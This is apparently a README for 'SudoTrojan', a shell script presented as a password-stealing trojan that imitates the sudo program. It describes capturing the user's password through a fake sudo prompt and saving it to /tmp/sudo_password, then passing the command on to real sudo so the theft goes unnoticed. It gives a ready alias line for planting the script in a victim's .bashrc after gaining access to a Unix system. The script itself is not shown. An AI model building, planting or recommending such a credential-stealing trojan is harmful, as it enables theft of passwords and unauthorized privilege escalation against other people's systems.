# SudoTrojan
A shell script that behaves like the sudo program

## Description
This is just a little thing I whipped up while I was messing around. It's pretty self expanatory. It behaves like the sudo program 
but it takes the password and writes it to an arbitrary file. A possible use for this is if you get access 
to a *nix system and can write to a sudo user's .bashrc. All you'd have to do is put this in the .bashrc with the other aliases: 
`alias sudo="./path/to/sudo/trojan.sh"`
### How it works
1. Execution
2. Script uses "read" with the sudo prompt to get the password from the user
3. Script writes the password to the file specified in the script (/tmp/sudo_password)
4. Script executes the actual sudo program and runs the sudo command the user intended
